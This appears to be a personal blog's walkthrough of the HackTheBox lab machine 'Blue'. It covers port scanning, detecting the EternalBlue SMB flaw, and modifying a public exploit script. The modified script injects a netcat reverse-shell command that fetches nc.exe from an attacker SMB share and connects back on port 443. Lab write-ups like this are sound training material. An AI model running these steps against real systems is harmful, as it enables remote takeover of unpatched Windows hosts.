@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Blue HTB Write Up | AbusingLinux</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Blue HTB Write Up" />
+<meta name="author" content="isuckatlinux" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction Today we are going to PWN a HackTheBox machine called Blue. Blue is an easy machine, we are going to use tools such as nmap to scan the ports, crackmapexec to recognise all the network devices via smb. We are going to exploit an EternalBlue vulnerability, and finally we are going to learn how to inject code in the victim’s machine through this vulnerability." />
+<meta property="og:description" content="Introduction Today we are going to PWN a HackTheBox machine called Blue. Blue is an easy machine, we are going to use tools such as nmap to scan the ports, crackmapexec to recognise all the network devices via smb. We are going to exploit an EternalBlue vulnerability, and finally we are going to learn how to inject code in the victim’s machine through this vulnerability." />
+<link rel="canonical" href="https://abusinglinux.com//2021/12/31/blue-htb-writeup.html" />
+<meta property="og:url" content="https://abusinglinux.com//2021/12/31/blue-htb-writeup.html" />
+<meta property="og:site_name" content="AbusingLinux" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-31T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Blue HTB Write Up" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"isuckatlinux"},"dateModified":"2021-12-31T00:00:00+00:00","datePublished":"2021-12-31T00:00:00+00:00","description":"Introduction Today we are going to PWN a HackTheBox machine called Blue. Blue is an easy machine, we are going to use tools such as nmap to scan the ports, crackmapexec to recognise all the network devices via smb. We are going to exploit an EternalBlue vulnerability, and finally we are going to learn how to inject code in the victim’s machine through this vulnerability.","headline":"Blue HTB Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"https://abusinglinux.com//2021/12/31/blue-htb-writeup.html"},"url":"https://abusinglinux.com//2021/12/31/blue-htb-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://abusinglinux.com//feed.xml" title="AbusingLinux" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">AbusingLinux<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/ISuckAtLinuxxx"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/isuckatlinux"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/linux.gif
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hi, Im Pedro García a cybersecurity and ethical hacking learner. I will be sharing on this web site all my knowledge of these particular arts. I hope you enjoy this blog as much as I do writting all this! <3
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Blue HTB Write Up</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/hackthebox/">hackthebox</a>
+      
+      <a class="tag" href="/tag/writeup/">writeup</a>
+      
+      <a class="tag" href="/tag/eternal-blue/">eternal-blue</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 31 Dec 2021</div>
+  
+  <h2 id="introduction">Introduction</h2>
+<p>Today we are going to PWN a HackTheBox machine called Blue.
+Blue is an easy machine, we are going to use tools such as nmap to scan the ports, crackmapexec to recognise all the network devices via smb.
+We are going to exploit an EternalBlue vulnerability, and finally we are going to learn how to inject code in the victim’s machine through this vulnerability.</p>
+
+<h2 id="dependencies">Dependencies</h2>
+<ul>
+  <li>
+    <p>In order to everything work you must have Python2 and pip2 installed.
+<a href="../../../../2021/12/30/installing-pip2-on-parrot.html">HowToInstallPip2Parrot</a></p>
+  </li>
+  <li>
+    <p>crackmapexec</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>crackmapexec
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="ports-recognizement">Ports recognizement</h2>
+<p>The ip address of this machine is the 10.10.10.40.
+First we need to indetify all the ports open on the machine, we are going to run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.40 <span class="nt">-oG</span> ports
+</code></pre></div></div>
+<ul>
+  <li>-sS -&gt; TCP SYN (Stealth) Scan</li>
+  <li>–min-rate -&gt; specify the number of packets you are sending per second</li>
+  <li>-p- -&gt; scan all range of ports</li>
+  <li>–open -&gt; only scan open ports</li>
+  <li>-vvv -&gt; while the program in running you can get additional information about hte proccess</li>
+  <li>-n -&gt; don’t use DNS resolution</li>
+  <li>-Pn -&gt; use it if the host is blocking ping proves</li>
+  <li>-oG -&gt; return the result in a grepeable file in order to proccess it later</li>
+</ul>
+
+<p>We are going to use <a href="https://github.com/isuckatlinux/getPorts">getPorts</a> to extract all the relevant data from the nmap output</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getPorts ports
+</code></pre></div></div>
+
+<p>Once we extracted all the ports we are going to find out the service they are running:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p135</span>,139,445,49153 10.10.10.40 <span class="nt">-oN</span> services
+</code></pre></div></div>
+<ul>
+  <li>-oN -&gt; return the output into a nmap file</li>
+  <li>-sV -&gt; enum services</li>
+  <li>-p<em>p1, p2, pn</em> -&gt; specify this ports</li>
+</ul>
+
+<p>We can see port 445 open, this might be a smb vulnerability, let’s find out.
+With <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> we can see all the devices using a service over the entire network (beside other uses)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.0/24
+</code></pre></div></div>
+<p><em>Because we are targeting a particular computer we could also specify this computer and not the entire network</em></p>
+
+<p>We see the host is runnning windows7 🤓 <br />
+MS017, most know as Eternal Blue, was a vulnerability in the smb protocol that affectes WindowsXP and windows7 computers.
+If this haven’t been patched on the machine this means that we already got a very serious vulneravilty in the system that will allow us to execute code as admin.</p>
+
+<p>We are going to see two ways of see if this machine is vulnerable:</p>
+<ol>
+  <li>Nmap scripts.<br />
+Nmap have a lot of scripts that allows checking multiple vulneravilities. These scripts are sorted by categories.
+In order to see all the categories in nmap we could run:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate .nse | xargs <span class="nb">grep</span> <span class="s2">"categories"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'"*"'</span> | <span class="nb">sort</span> <span class="nt">-u</span>
+</code></pre></div>    </div>
+    <p>We can see a bunch of categories, we will cover all the categories in another post soon 🤖.
+For the time we are going to be using “vuln and safe”
+So lets run:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> <span class="s2">"vuln and safe"</span> <span class="nt">-p445</span> 10.10.10.40 <span class="nt">-oN</span> smbVulnerable
+</code></pre></div>    </div>
+    <p><img src="https://abusinglinux.com/assets/images/blue-htb/nmap_scripts_output.png" alt="image1" />
+<br />
+BINGO! We can see in the picture the service is vulnerable</p>
+  </li>
+  <li>Eternal blue checker <br />
+We are going to use a <a href="https://github.com/worawit/MS17-010">checker</a>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/worawit/MS17-010
+<span class="nb">cd </span>MS17-010
+</code></pre></div>    </div>
+    <p>The checker is named <em>checker.py</em><br />
+We run:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 checker.py 10.10.10.40
+</code></pre></div>    </div>
+    <p>We can see all the pipes are denied.
+We have to try the user ‘guest’. We look into the code and we see two fields empty, the username and the password.
+We introduce ‘guest’ in the username string.
+<br />
+We run again:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 checker.py 10.10.10.40
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><img src="https://abusinglinux.com/assets/images/blue-htb/username_guest.PNG" alt="image2" /><br />
+As we can see we have a bunch of pipes that reported OK. <br /></p>
+
+<h2 id="exploiting">Exploiting</h2>
+<p>In the exploiting phase we could use Metasploit, but there is an issue with that. Eternal blue is a kernel-level vulnerability, that means that if anything goes wrong (or everything doesn’t go perfect) we most likely to have blue screen or very inestable shells.
+That’s why in these cases where you want to have all control is actually better to just inject the code yourself.</p>
+
+<p>In order to proceed to inject code we are going to use the repo we used before to check the vulnerability <a href="https://github.com/worawit/MS17-010">MS17-010</a>.</p>
+
+<p>Now we are going to use the zzz_exploit.py
+This exploit run a trivial command on the victim’s machine. We are going to find that command and replace it with our personal one.
+The method we are going to edit is <em>smb_pwn</em>.<br />
+We are going to comment all lines of the code except the first one. And we are going to decomment the <em>service_exec</em> line <br />
+The code should look like this:<br />
+<img src="https://abusinglinux.com/assets/images/blue-htb/zzz_modified.PNG" alt="image3" /></p>
+
+<p>We are going to exploit this vulnerability by sharing a folder with smb witch contains <a href="https://es.wikipedia.org/wiki/Netcat">netcat</a> and we are going to run netcat from the victims machine to produce a reverse shell.
+The command we have to inject is the next</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c <span class="se">\\</span>&lt;your_tun0_ip&gt;<span class="se">\s</span>haredFolder<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd &lt;your_tun0_ip&gt; 443
+</code></pre></div></div>
+<p>So you the line have to look like that:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">service_exec</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="sa">r</span><span class="s">'cmd /c \\&lt;your_tun0_ip&gt;\sharedFolder\nc.exe -e cmd &lt;your_tun0_ip&gt; 443'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>In addition, we have to set the username to ‘guest’ just how we did on the checker</p>
+
+<p>So, the steps are:</p>
+<ol>
+  <li>Share a folder with the netcat
+    <ul>
+      <li>We have to locate netcat in our machine and copy it to our folder wich we are going to be sharing soon
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> locate nc.exe
+ <span class="nb">cp</span> <span class="k">*</span>path_to_netcat<span class="k">*</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
+</code></pre></div>        </div>
+        <p>If you are not able to locate nc.exe here’s a link to download <a href="https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip">netcat</a><br />
+ <em>At this point we have to have netcat in our folder</em></p>
+      </li>
+      <li>Share the folder
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> imppacket-smbserver sharedFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span> 
+</code></pre></div>        </div>
+        <p><em>The flag smb2support is no necessary beacuse we are dealing with version one of the smb protocol, but It’s a good practice to give support v2 just in case</em></p>
+      </li>
+    </ul>
+  </li>
+  <li>Listening at port 443 to get the reverse shell
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nc <span class="nt">-nlvp</span> 443
+</code></pre></div>    </div>
+  </li>
+  <li>Finallly exploiting!
+We could use any pipe the checker reported to be OK.<br />
+We are going to use samr</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zzz_exploit.py 10.10.10.40 samr
+</code></pre></div></div>
+
+<blockquote>
+  <p>BOOM 💥</p>
+</blockquote>
+
+<p>If everything it’s working fine we should see a shell.
+We could run</p>
+<pre><code class="language-cmd">whoami
+</code></pre>
+<p>We should see nt authority system, that means that we have admin privileges.</p>
+
+<p>Now let’s see the flags:</p>
+<pre><code class="language-cmd">cd C:\Users\haris\Desktop
+type user.txt
+
+cd C:\Users\Administrator\Desktop
+type root.txt
+</code></pre>
+
+<p>Thank’s all for reading this! I hope you enjoyed this writing, any feedback is welcome.</p>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+    /*
+    var disqus_config = function () {
+    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://isuckatlinux.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://abusinglinux.com//2021/12/31/blue-htb-writeup.html';
+     this.page.identifier = '/2021/12/31/blue-htb-writeup';
+     this.page.title = 'Blue HTB Write Up';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//https://abusinglinux.com/.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/09/07/backdoor-htb-writeup.html">
+            Backdoor HTB WriteUp
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/07/07/storing-api-credentials-in-Python.html">
+            Storing API credentials on Python
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/02/11/get-full-interactive-reverse-shell-with-socat.html">
+            Get Full Interactive reverse Shell With Socat
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/python/" class="set-1">Python</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/eternal-blue/" class="set-1">eternal-blue</a> <a href="/tag/good-practice/" class="set-1">good-practice</a> <a href="/tag/hackthebox/" class="set-5">hackthebox</a> <a href="/tag/moodle/" class="set-1">moodle</a> <a href="/tag/nosqlinyection/" class="set-1">nosqlinyection</a> <a href="/tag/parrot/" class="set-1">parrot</a> <a href="/tag/pentest-basics/" class="set-2">pentest-basics</a> <a href="/tag/python2/" class="set-1">python2</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-shell/" class="set-4">reverse-shell</a> <a href="/tag/screen/" class="set-1">screen</a> <a href="/tag/socat/" class="set-1">socat</a> <a href="/tag/wordpress/" class="set-1">wordpress</a> <a href="/tag/writeup/" class="set-4">writeup</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
